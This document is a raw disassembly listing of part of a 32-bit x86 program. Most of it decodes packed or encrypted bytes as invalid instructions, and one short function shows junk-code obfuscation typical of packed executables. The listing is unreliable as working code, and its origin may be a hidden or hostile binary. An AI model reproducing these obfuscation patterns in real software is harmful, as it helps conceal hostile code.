  40d0ff:	fsubr  st,st(1)
  40d101:	cmc    
  40d102:	mov    edx,DWORD PTR [eax-0x20]
  40d105:	addr16 jmp 0xaf7f:0x35bb83c3
  40d10d:	test   eax,0x4331f1b1
  40d112:	sub    esi,DWORD PTR [ebx+0x14f6c4f]
  40d118:	inc    eax
  40d119:	jnp    0x40d136
  40d11b:	jnp    0x40d193
  40d11d:	adc    eax,DWORD PTR ss:[eax+0x6]
  40d121:	jg     0x40d0f7
  40d123:	ss cmp eax,0x5fe22e39
  40d129:	stos   BYTE PTR es:[edi],al
  40d12a:	pop    ds
  40d12b:	call   0xb875:0x4dc5f3a
  40d132:	add    DWORD PTR [eax-0x7c],esp
  40d135:	rcr    BYTE PTR [esi-0x49],0xb4
  40d139:	dec    eax
  40d13a:	mov    edx,DWORD PTR [edi+0x335057ee]
  40d140:	retf   
  40d141:	mov    ebp,0xb24026ed
  40d146:	gs inc esp
  40d148:	xor    al,0x66
  40d14a:	outs   dx,DWORD PTR ds:[esi]
  40d14b:	(bad)  [edi+0x7ef6732d]
  40d151:	push   eax
  40d152:	xor    al,0x4
  40d154:	ja     0x40d11a
  40d156:	ss pushf 
  40d158:	cmp    al,0xad
  40d15a:	xchg   ecx,eax
  40d15b:	je     0x40d1bf
  40d15d:	repz fistp WORD PTR [ecx]
  40d160:	inc    eax
  40d161:	leave  
  40d162:	sub    esp,DWORD PTR [edx-0x2e]
  40d165:	cmp    esi,esp
  40d167:	retf   0x47fd
  40d16a:	cmp    edx,eax
  40d16c:	xor    ah,bh
  40d16e:	pop    edx
  40d16f:	pop    ds
  40d170:	mov    esi,0x51ee47d4
  40d175:	mov    edi,0x34fea3e4
  40d17a:	xor    al,bh
  40d17c:	pushf  
  40d17d:	pop    ecx
  40d17e:	mov    ah,0xe6
  40d180:	enter  0x4483,0x36
  40d184:	fnstenv [ecx]
  40d186:	mov    BYTE PTR [edi+0x22],dl
  40d189:	push   es
  40d18a:	sbb    DWORD PTR [esi-0x1a],0xffffff82
  40d18e:	data16 (bad) 
  40d190:	push   0xffffffd0
  40d192:	mov    es,WORD PTR [eax-0x3d3085e7]
  40d198:	inc    edx
  40d199:	lock cmp DWORD PTR [edx+0x7b31702f],edi
  40d1a0:	rcr    al,0x20
  40d1a3:	push   ebx
  40d1a4:	scas   al,BYTE PTR es:[edi]
  40d1a5:	push   0xffffffb6
  40d1a7:	dec    ebp
  40d1a8:	mov    bl,0xa1
  40d1aa:	dec    esp
  40d1ab:	call   DWORD PTR [ecx-0x2670ca42]
  40d1b1:	out    dx,eax
  40d1b2:	(bad)  [edi-0x1061e7c6]
  40d1b8:	loope  0x40d178
  40d1ba:	sub    ah,BYTE PTR [ebx+esi*1]
  40d1bd:	(bad)  
  40d1bf:	in     al,0xb2
  40d1c1:	xor    eax,0xfc2af4f9
  40d1c6:	out    0xa5,eax
  40d1c8:	repnz push esp
  40d1ca:	inc    esp
  40d1cb:	or     DWORD PTR [esi],edx
  40d1cd:	repz daa 
  40d1cf:	rcr    DWORD PTR ds:0x5ab27311,1
  40d1d5:	jae    0x40d251
  40d1d7:	mov    bh,0x97
  40d1d9:	sub    al,0xee
  40d1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1dc:	mov    esp,0xf4a89ecb
  40d1e1:	mov    ah,0x4c
  40d1e3:	mov    eax,0xf0dcca95
  40d1e8:	adc    bl,BYTE PTR [edi+0x8]
  40d1eb:	ss pop esi
  40d1ed:	rol    BYTE PTR [esi],0x45
  40d1f0:	sbb    ch,BYTE PTR [esp+ecx*2-0x567010d0]
  40d1f7:	jo     0x40d1a6
  40d1f9:	sbb    ebp,DWORD PTR [ebx]
  40d1fb:	push   0x2
  40d1fd:	xchg   cl,ah
  40d1ff:	or     DWORD PTR [edi+0x711e3c3f],0x5a
  40d206:	cli    
  40d207:	sub    ch,dl
  40d209:	test   DWORD PTR [ecx],ebx
  40d20b:	inc    BYTE PTR [ecx+0x30]
  40d20e:	pop    esp
  40d20f:	xchg   ebp,eax
  40d210:	call   0xbcc55ec5
  40d215:	clc    
  40d216:	mov    DWORD PTR [ecx],ebp
  40d218:	xor    BYTE PTR ds:0x3e35594d,dh
  40d21e:	test   DWORD PTR [ebx+0x43eaa100],ebp
  40d224:	les    edx,FWORD PTR ds:0x5ef7592
  40d22a:	iret   
  40d22b:	jmp    0x40d263
  40d22d:	pop    ebp
  40d22e:	mov    ds:0xb5858826,eax
  40d233:	(bad)  
  40d234:	cdq    
  40d235:	in     eax,0x24
  40d237:	mov    bh,dl
  40d239:	sub    ch,BYTE PTR [edx]
  40d23b:	iret   
  40d23c:	jne    0x40d1e8
  40d23e:	dec    ebp
  40d23f:	test   ebp,ebp
  40d241:	fldenv [ebx-0x41a5d5ae]
  40d247:	jecxz  0x40d1fa
  40d249:	xchg   edi,eax
  40d24a:	aas    
  40d24b:	pushf  
  40d24c:	push   ss
  40d24d:	cwde   
  40d24e:	icebp  
  40d24f:	pop    ebx
  40d250:	or     DWORD PTR [edi+0x3b846f95],edx
  40d256:	xchg   DWORD PTR [eax],ebx
  40d258:	cmp    al,0x3f
  40d25a:	xchg   edi,eax
  40d25b:	or     ebx,ecx
  40d25d:	inc    ebx
  40d25e:	sub    al,0x7c
  40d260:	imul   eax,ebp,0x76335a97
  40d266:	fld    DWORD PTR [esi]
  40d268:	aas    
  40d269:	dec    ebp
  40d26a:	push   0x43416237
  40d26f:	jg     0x40d1f5
  40d271:	dec    esi
  40d272:	or     BYTE PTR [ebx+0x48],cl
  40d275:	xor    edi,DWORD PTR [eax-0x35]
  40d278:	inc    ebp
  40d279:	cmp    BYTE PTR [esi+eiz*2+0x5e2b887],bl
  40d280:	loope  0x40d23a
  40d282:	push   edx
  40d283:	out    0x29,al
  40d285:	add    al,0xf0
  40d287:	add    DWORD PTR es:[edi],ebx
  40d28a:	imul   edi,DWORD PTR [eax+edx*8-0x6d],0xffffffc3
  40d28f:	and    ebp,DWORD PTR [ebx+0x32e8c821]
  40d295:	mov    edx,DWORD PTR [edx+0xf09f800]
  40d29b:	aas    
  40d29c:	add    DWORD PTR [ebx],ecx
  40d29e:	xchg   esi,eax
  40d29f:	add    al,0xde
  40d2a1:	mov    eax,ds:0xf8df2ebd
  40d2a6:	sahf   
  40d2a7:	cmp    DWORD PTR [ebx+0x3eb39e38],esp
  40d2ad:	mov    ecx,0xcf38b996
  40d2b2:	cmp    al,0x5e
  40d2b4:	push   ebp
  40d2b5:	xlat   BYTE PTR ds:[ebx]
  40d2b6:	pop    edx
  40d2b7:	jecxz  0x40d2d0
  40d2b9:	and    esi,ebp
  40d2bb:	sahf   
  40d2bc:	push   esp
  40d2bd:	mov    ebp,0xd979d8bb
  40d2c2:	mov    edi,gs
  40d2c4:	adc    edi,ecx
  40d2c6:	fmul   QWORD PTR [ecx-0x28]
  40d2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ca:	jnp    0x40d2d1
  40d2cc:	popf   
  40d2cd:	inc    edi
  40d2ce:	sbb    eax,0x2c84294a
  40d2d3:	add    WORD PTR [eax-0x4e],si
  40d2d7:	fstp   TBYTE PTR [edx+0xd1acc42]
  40d2dd:	lock cmp DWORD PTR [ebx+0x894b219],ebx
  40d2e4:	js     0x40d2e5
  40d2e6:	rol    BYTE PTR ds:0x6cb3f81e,cl
  40d2ec:	fs fwait
  40d2ee:	js     0x40d2eb
  40d2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f1:	aas    
  40d2f2:	adc    ebx,edi
  40d2f4:	fisubr WORD PTR [edi-0x147a7fd7]
  40d2fa:	dec    ebx
  40d2fb:	fcmovbe st,st(0)
  40d2fd:	dec    ebp
  40d2fe:	adc    al,0xef
  40d300:	add    DWORD PTR [edi-0x3d],esp
  40d303:	sahf   
  40d304:	pop    ss
  40d305:	int    0x9e
  40d307:	push   esi
  40d308:	sub    eax,ebx
  40d30a:	out    dx,al
  40d30b:	stos   DWORD PTR es:[edi],eax
  40d30c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d30d:	outs   dx,BYTE PTR ds:[esi]
  40d30e:	or     dl,bl
  40d310:	dec    edx
  40d311:	fistp  WORD PTR [edi+esi*1-0x6a]
  40d315:	jmp    0x3b3038bd
  40d31a:	mov    al,ds:0x87d060f8
  40d31f:	and    cl,BYTE PTR [eax-0x7424ccb0]
  40d325:	aam    0x4a
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	pop    esp
  40d339:	push   cs
  40d33a:	cld    
  40d33b:	dec    ebx
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	inc    eax
  40d345:	xlat   BYTE PTR ds:[ebx]
  40d346:	add    eax,DWORD PTR [ebp-0x76069aa7]
  40d34c:	loop   0x40d398
  40d34e:	ds jae 0x40d302
  40d351:	add    esi,DWORD PTR [esi-0x3f]
  40d354:	add    esi,DWORD PTR ds:0x6f1605ca
  40d35a:	and    BYTE PTR [esi],dl
  40d35c:	in     eax,0x46
  40d35e:	test   DWORD PTR [ebx-0x342855e],ecx
  40d364:	mov    dh,0xca
  40d366:	stos   BYTE PTR es:[edi],al
  40d367:	movnti DWORD PTR ds:0x806f6e36,ebp
  40d36e:	fsubr  DWORD PTR [edx+0x7]
  40d371:	push   0xfffffff6
  40d373:	jns    0x40d3a8
  40d375:	pop    ss
  40d376:	loope  0x40d38e
  40d378:	xchg   edx,eax
  40d379:	(bad)  
  40d37a:	scas   eax,DWORD PTR es:[edi]
  40d37b:	cdq    
  40d37c:	mov    cs,ebp
  40d37e:	jl     0x40d36f
  40d380:	push   ebx
  40d381:	push   ss
  40d382:	pop    ss
  40d383:	push   cs
  40d384:	or     ebx,DWORD PTR [edx-0x5]
  40d387:	stc    
  40d388:	pushf  
  40d389:	int    0x59
  40d38b:	jg     0x40d3e0
  40d38d:	popa   
  40d38e:	rcl    cl,1
  40d390:	in     eax,dx
  40d391:	(bad)  
  40d393:	test   eax,0xd96a0fc7
  40d398:	inc    edi
  40d399:	es push 0x1ed7a77c
  40d39f:	or     eax,0x68d21f0d
  40d3a4:	or     al,0x57
  40d3a6:	pop    ebp
  40d3a7:	or     al,BYTE PTR [ebp+0x2]
  40d3aa:	bound  esi,QWORD PTR [edi+edi*4+0x19]
  40d3ae:	jge    0x40d418
  40d3b0:	mov    esp,0xcb02fbc8
  40d3b5:	mov    ds:0x85ad4486,eax
  40d3ba:	ds ret 
  40d3bc:	popa   
  40d3bd:	and    ebp,ebx
  40d3bf:	mov    al,ds:0x65b75568
  40d3c4:	inc    eax
  40d3c5:	adc    DWORD PTR [esi+0x50],edx
  40d3c8:	(bad)  
  40d3c9:	mov    ecx,0x99e22891
  40d3ce:	ins    DWORD PTR es:[edi],dx
  40d3cf:	add    DWORD PTR [edx+0x4e],ebp
  40d3d2:	mov    ah,0xf6
  40d3d4:	frstor [edi+0x1c0c93f6]
  40d3da:	mov    BYTE PTR [edi-0x30],ah
  40d3dd:	jmp    0xe9509c08
  40d3e2:	jnp    0x40d3cb
  40d3e4:	mov    ecx,0x48b24462
  40d3e9:	dec    esp
  40d3ea:	dec    ebx
  40d3eb:	jp     0x40d3a1
  40d3ed:	int3   
  40d3ee:	out    dx,eax
  40d3ef:	jg     0x40d3be
  40d3f1:	sub    eax,esp
  40d3f3:	cmp    DWORD PTR [eax-0x3d8719ed],esi
  40d3f9:	jge    0x40d476
  40d3fb:	(bad)  
  40d3fc:	and    ebx,edx
  40d3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ff:	lea    eax,[edi-0x497a9aa8]
  40d405:	mov    al,0x2d
  40d407:	aaa    
  40d408:	ja     0x40d46e
  40d40a:	in     al,dx
  40d40b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d40c:	(bad)  
  40d40d:	mov    ecx,0xc609fa38
  40d412:	out    0xf3,eax
  40d414:	cli    
  40d415:	fcomi  st,st(2)
  40d417:	repnz xchg esp,eax
  40d419:	jecxz  0x40d3da
  40d41b:	cs mov ch,0xca
  40d41e:	jmp    0x9e91e0d2
  40d423:	push   eax
  40d424:	sbb    al,0x6d
  40d426:	cld    
  40d427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d428:	inc    ebp
  40d429:	je     0x40d45e
  40d42b:	add    bl,BYTE PTR [esi+0x4036ae2f]
  40d431:	sbb    bl,BYTE PTR [eax+0x64]
  40d434:	pop    eax
  40d435:	xor    ebp,DWORD PTR [eax]
  40d437:	es out 0x9,eax
  40d43a:	neg    DWORD PTR [ecx-0x22]
  40d43d:	fwait
  40d43e:	add    esp,DWORD PTR [edx-0x6d]
  40d441:	inc    ecx
  40d442:	cli    
  40d443:	rol    BYTE PTR [edx],0x4a
  40d446:	push   esi
  40d447:	cmp    esp,DWORD PTR ds:[edi-0xd3cd3b9]
  40d44e:	icebp  
  40d44f:	shl    esi,cl
  40d451:	xchg   esp,eax
  40d452:	mov    eax,edx
  40d454:	pop    ebp
  40d455:	out    0x9d,al
  40d457:	or     edx,DWORD PTR [eiz*1-0x6b542150]
  40d45e:	push   edi
  40d45f:	sub    bl,bh
  40d461:	cdq    
  40d462:	data16 jl 0x40d476
  40d465:	dec    edx
  40d466:	frstor [esi]
  40d468:	jl     0x40d3f1
  40d46a:	mov    al,0x8c
  40d46c:	jo     0x40d4cf
  40d46e:	retf   0xeaa0
  40d471:	(bad)  
  40d472:	retf   0x7e4c
  40d475:	xor    al,0x4f
  40d477:	inc    ebp
  40d478:	or     al,0x31
  40d47a:	xor    DWORD PTR [ebp-0x568c810f],ebx
  40d480:	(bad)
  40d485:	fs and eax,0xc20fade3
  40d48b:	sar    edx,1
  40d48d:	icebp  
  40d48e:	push   edx
  40d48f:	and    al,0x42
  40d491:	inc    esi
  40d492:	mov    esi,0x7bae1b63
  40d497:	in     eax,0x7c
  40d499:	scas   al,BYTE PTR es:[edi]
  40d49a:	test   BYTE PTR [ecx-0x454ec229],al
  40d4a0:	lock shl BYTE PTR [ebx],1
  40d4a3:	aam    0xbd
  40d4a5:	daa    
  40d4a6:	sti    
  40d4a7:	ins    DWORD PTR es:[edi],dx
  40d4a8:	stos   BYTE PTR es:[edi],al
  40d4a9:	cdq    
  40d4aa:	out    dx,al
  40d4ab:	mov    ebp,0x1c3a9f3e
  40d4b0:	(bad)  
  40d4b1:	jle    0x40d45d
  40d4b3:	pop    edx
  40d4b4:	and    eax,DWORD PTR [ebx+0x6b]
  40d4b7:	fldcw  WORD PTR [ecx-0x5048a8e]
  40d4bd:	fdivr  DWORD PTR [ebp+0x160b3dca]
  40d4c3:	mov    ds,WORD PTR [edx+0x12]
  40d4c6:	mul    DWORD PTR [edx+0x1d]
  40d4c9:	lock stos DWORD PTR es:[edi],eax
  40d4cb:	xchg   esi,eax
  40d4cc:	sub    al,0x3c
  40d4ce:	adc    DWORD PTR [edx+0x3e],0x55f4b139
  40d4d5:	pop    edi
  40d4d6:	cmp    eax,0xfb18144d
  40d4db:	pushf  
  40d4dc:	(bad)  
  40d4dd:	cdq    
  40d4de:	xor    eax,DWORD PTR [edx-0x314f14cb]
  40d4e4:	out    0x6e,eax
  40d4e6:	shr    DWORD PTR [ebx-0x78],cl
  40d4e9:	es daa 
  40d4eb:	jo     0x40d524
  40d4ed:	xor    edx,DWORD PTR [edi]
  40d4ef:	cs bnd ret 
  40d4f2:	inc    ebx
  40d4f3:	and    DWORD PTR [ecx-0x58],eax
  40d4f6:	adc    al,0x50
  40d4f8:	or     BYTE PTR [edi+0x346435ec],bl
  40d4fe:	xchg   ecx,eax
  40d4ff:	call   0x2f33:0x506511b4
  40d506:	mov    edi,0x3640dc09
  40d50b:	mov    al,0x71
  40d50d:	and    DWORD PTR [edi],ecx
  40d50f:	sbb    eax,0x5584816a
  40d514:	push   es
  40d515:	dec    esi
  40d517:	lds    edi,FWORD PTR [eax-0x728b2450]
  40d51d:	or     ebx,DWORD PTR [edi-0x79]
  40d520:	add    eax,0xbff20d71
  40d525:	adc    eax,0x371b61ed
  40d52a:	cmp    ch,BYTE PTR [edx+edi*2-0x66]
  40d52e:	aad    0xcb
  40d530:	jecxz  0x40d573
  40d532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d533:	mov    esp,esi
  40d535:	stos   BYTE PTR es:[edi],al
  40d536:	ja     0x40d5a3
  40d538:	fwait
  40d539:	enter  0x8554,0xa9
  40d53d:	adc    esp,DWORD PTR [eax-0x13]
  40d540:	popa   
  40d541:	fprem1 
  40d543:	ins    DWORD PTR es:[edi],dx
  40d544:	xor    eax,ebp
  40d546:	mov    ebp,0xa111e7d9
  40d54b:	retf   
  40d54c:	jmp    0x40d4f4
  40d54e:	mov    ds:0x472d7186,eax
  40d553:	jb     0x40d547
  40d555:	test   DWORD PTR [edi],edx
  40d557:	cmp    al,0xf
  40d559:	imul   ecx,DWORD PTR [eax],0xfffffff2
  40d55c:	xchg   edi,eax
  40d55d:	mov    ss,WORD PTR [edi+0x2c]
  40d560:	push   ds
  40d561:	xchg   DWORD PTR [esi+0x65],ebp
  40d564:	rol    DWORD PTR ds:0xd33f8b46,cl
  40d56a:	cmp    al,0xc4
  40d56c:	loopne 0x40d554
  40d56e:	add    BYTE PTR [ebx-0x6d207e90],bl
  40d574:	sbb    BYTE PTR [ecx+0x4d7d7a72],dl
  40d57a:	fnstcw WORD PTR [ecx+0x4f1a59cc]
  40d580:	add    esp,DWORD PTR [edx-0x7c5db687]
  40d586:	add    ebp,DWORD PTR [edi+0x343019b]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x8ba0482a
  40d6f9:	and    DWORD PTR [edx+0x7e927aa8],ecx
  40d6ff:	jle    0x40d73f
  40d701:	jl     0x40d781
  40d703:	jle    0x40d6ef
  40d705:	xor    eax,0x5973070
  40d70a:	imul   ebx,DWORD PTR [esi-0x5a],0x83453c4f
  40d711:	rcl    BYTE PTR ds:[edi],1
  40d714:	retf   
  40d715:	out    0x71,al
  40d717:	dec    DWORD PTR [eax+0x36]
  40d71a:	loop   0x40d6f1
  40d71c:	shl    cl,cl
  40d71e:	pushf  
  40d71f:	inc    ebp
  40d720:	mov    ebx,0x9b4b8448
  40d725:	bound  edi,QWORD PTR [ecx]
  40d727:	push   ecx
  40d728:	ret    0x301
  40d72b:	jmp    0xfa36ac18
  40d730:	imul   DWORD PTR [esi+0x39]
  40d733:	enter  0xf892,0x35
  40d737:	nop
  40d738:	daa    
  40d739:	outs   dx,DWORD PTR ds:[esi]
  40d73a:	imul   ebp,DWORD PTR [esi],0xef12b384
  40d740:	cmp    eax,0x8eb6bc07
  40d745:	shl    BYTE PTR [ebx],1
  40d747:	pop    es
  40d748:	cmp    al,bl
  40d74a:	sti    
  40d74b:	iret   
  40d74c:	outs   dx,DWORD PTR ds:[esi]
  40d74d:	out    0xa2,al
  40d74f:	jnp    0x40d7ce
  40d751:	call   0x89840e53
  40d756:	cdq    
  40d757:	int    0xb6
  40d759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d75a:	sub    bl,ch
  40d75c:	or     BYTE PTR [ecx],dl
  40d75e:	or     BYTE PTR [esp+ebx*4],ch
  40d761:	push   ebp
  40d762:	into   
  40d763:	sub    al,0x3d
  40d765:	mov    BYTE PTR [esi],al
  40d767:	popf   
  40d768:	cmp    eax,0x3062e47d
  40d76d:	push   ebp
  40d76e:	push   cs
  40d76f:	sar    BYTE PTR [eax],0x6f
  40d772:	cmp    eax,0xfe2f6b03
  40d777:	mov    esp,0x6cdef7ee
  40d77c:	test   al,0xbc
  40d77e:	scas   eax,DWORD PTR es:[edi]
  40d77f:	in     eax,dx
  40d780:	ficom  DWORD PTR [ebx-0x6d]
  40d783:	loop   0x40d709
  40d785:	mov    ds:0x2c571c7e,eax
  40d78a:	std    
  40d78b:	fwait
  40d78c:	addr16 repz jnp 0x40d7a5
  40d790:	popa   
  40d791:	adc    al,0xa1
  40d793:	inc    edi
  40d794:	js     0x40d7ea
  40d796:	in     eax,0x49
  40d798:	and    ecx,DWORD PTR [ebp+0x61]
  40d79b:	and    eax,0xd0d789c1
  40d7a0:	loop   0x40d72f
  40d7a2:	add    eax,0xfb30ba20
  40d7a7:	pop    edi
  40d7a8:	jge    0x40d736
  40d7aa:	pop    edi
  40d7ac:	call   0x1528:0xe5f52895
  40d7b3:	sbb    edi,DWORD PTR [esi-0x7b553722]
  40d7b9:	clc    
  40d7ba:	(bad)  [ebx]
  40d7bc:	dec    ecx
  40d7bd:	int    0x35
  40d7bf:	mov    ebp,0xc85b07dd
  40d7c4:	iret   
  40d7c5:	xor    ebx,ebx
  40d7c7:	and    al,0x75
  40d7c9:	adc    edi,DWORD PTR [ecx+0x697d554d]
  40d7cf:	inc    edi
  40d7d0:	jg     0x40d802
  40d7d2:	aaa    
  40d7d3:	pop    ss
  40d7d4:	arpl   WORD PTR ds:0x67025e32,ax
  40d7da:	es mov edi,0x572542f4
  40d7e0:	in     al,0xf0
  40d7e2:	in     eax,dx
  40d7e3:	mov    ebx,0x1e424ae5
  40d7e8:	and    DWORD PTR [ebx],0xffffff95
  40d7eb:	mov    edx,0xf756bddf
  40d7f0:	sbb    eax,0x1899dacd
  40d7f5:	ret    0xe5f8
  40d7f8:	sub    esi,DWORD PTR [esi+0x4724070a]
  40d7fe:	mov    dl,0x29
  40d800:	cli    
  40d801:	inc    ebx
  40d802:	stc    
  40d803:	pop    ds
  40d804:	inc    ebp
  40d805:	ss je  0x40d82c
  40d808:	xchg   esp,eax
  40d809:	dec    edx
  40d80a:	or     eax,0x7c196182
  40d80f:	xchg   ebx,eax
  40d810:	and    al,0xd8
  40d812:	int    0xec
  40d814:	(bad)  
  40d815:	gs mov ebp,0xf885a1b6
  40d81b:	xchg   ecx,eax
  40d81c:	push   edx
  40d81d:	xchg   eax,esp
  40d81f:	fst    QWORD PTR [ebx-0x7]
  40d822:	fist   WORD PTR [eax]
  40d824:	fsubr  DWORD PTR [eax+0x2d]
  40d827:	mov    esi,ecx
  40d829:	(bad)  
  40d82b:	xchg   ebp,eax
  40d82c:	mov    ebp,edi
  40d82e:	jno    0x40d847
  40d830:	xlat   BYTE PTR ds:[ebx]
  40d831:	mov    ebp,esp
  40d833:	test   DWORD PTR ds:[ebx+eax*2-0x7869c9b5],edi
  40d83b:	lods   al,BYTE PTR ds:[esi]
  40d83c:	test   DWORD PTR [eax+0x25],esi
  40d83f:	fdiv   DWORD PTR [eax+0x53]
  40d842:	cld    
  40d843:	mov    ebp,0xd7f52e91
  40d848:	test   DWORD PTR [esi+ecx*2-0x753fc6ad],ebp
  40d84f:	jg     0x40d8ce
  40d851:	fld    TBYTE PTR [edx]
  40d853:	retf   0xda6b
  40d856:	ja     0x40d869
  40d858:	jb     0x40d80c
  40d85a:	ror    BYTE PTR [eax-0x7d],1
  40d85d:	into   
  40d85e:	jae    0x40d8c6
  40d860:	sub    BYTE PTR [ebp-0x208fb903],dh
  40d866:	lods   eax,DWORD PTR ds:[esi]
  40d867:	pop    ebp
  40d868:	mov    DWORD PTR [eax],esi
  40d86a:	cmp    cl,BYTE PTR [ecx]
  40d86c:	mov    ebx,0xeadef1c9
  40d871:	sub    DWORD PTR [ecx],0x60
  40d874:	lahf   
  40d875:	mov    DWORD PTR [esp+edx*8-0x56],0x5d1e0736
  40d87d:	fwait
  40d87e:	(bad)  
  40d87f:	bnd jge 0x40d8f6
  40d882:	ret    0xd1c7
  40d885:	imul   ebx,DWORD PTR [esi],0x274b8972
  40d88b:	dec    ebp
  40d88c:	es mov cl,0x4a
  40d88f:	or     BYTE PTR [ebx],ah
  40d891:	shl    esp,cl
  40d893:	xchg   BYTE PTR [ebp+0x27baeff0],ah
  40d899:	mov    ch,0x83
  40d89b:	pop    esp
  40d89c:	cwde   
  40d89d:	clc    
  40d89e:	out    dx,al
  40d89f:	jmp    0x40d8fe
  40d8a1:	ins    BYTE PTR es:[edi],dx
  40d8a2:	lock xor BYTE PTR [edi+eiz*1-0x17],ch
  40d8a7:	(bad)  
  40d8a8:	outs   dx,BYTE PTR ds:[esi]
  40d8a9:	dec    edx
  40d8aa:	cmp    eax,0xf4dfc9fe
  40d8af:	enter  0xb015,0xc
  40d8b3:	xlat   BYTE PTR ds:[ebx]
  40d8b4:	les    ebp,FWORD PTR ds:0x1a5831c4
  40d8ba:	sbb    edx,ebx
  40d8bc:	xchg   esp,eax
  40d8bd:	cwde   
  40d8be:	pop    es
  40d8bf:	xor    al,0xc4
  40d8c1:	push   esi
  40d8c2:	cmp    BYTE PTR [ecx-0x56783cb2],ch
  40d8c8:	int    0x2e
  40d8ca:	mov    eax,0x967655a7
  40d8cf:	and    BYTE PTR [ecx-0x4a1fdb7d],cl
  40d8d5:	fstp   DWORD PTR [bx+di-0x74b8]
  40d8da:	and    BYTE PTR [ebp-0x6d],cl
  40d8dd:	sub    BYTE PTR [ebx-0x50],0xdb
  40d8e1:	mov    BYTE PTR [ebx],0x90
  40d8e4:	xor    edi,esi
  40d8e6:	sbb    BYTE PTR [ecx+0x3577cb05],bh
  40d8ec:	hlt    
  40d8ed:	retf   0x6981
  40d8f0:	push   ebp
  40d8f1:	pop    edx
  40d8f2:	sub    ch,BYTE PTR [ebp-0x48]
  40d8f5:	adc    eax,0xe23161e6
  40d8fa:	ror    DWORD PTR [ebx+0x55],0x2e
  40d8fe:	test   eax,0x49f3d4f5
  40d903:	(bad)  
  40d904:	scas   al,BYTE PTR es:[edi]
  40d905:	dec    esp
  40d906:	mov    edi,0x2ce95411
  40d90b:	sbb    al,0x8a
  40d90d:	inc    edx
  40d90e:	fs (bad) 
  40d910:	mov    ?,WORD PTR ds:0xfef60bd9
  40d916:	fs clc 
  40d918:	push   esi
  40d919:	jge    0x40d959
  40d91b:	xchg   esp,eax
  40d91c:	jnp    0x40d937
  40d91e:	and    BYTE PTR [eax-0x1a67446f],0xe3
  40d925:	repnz and DWORD PTR [ecx],esp
  40d928:	out    0xb9,eax
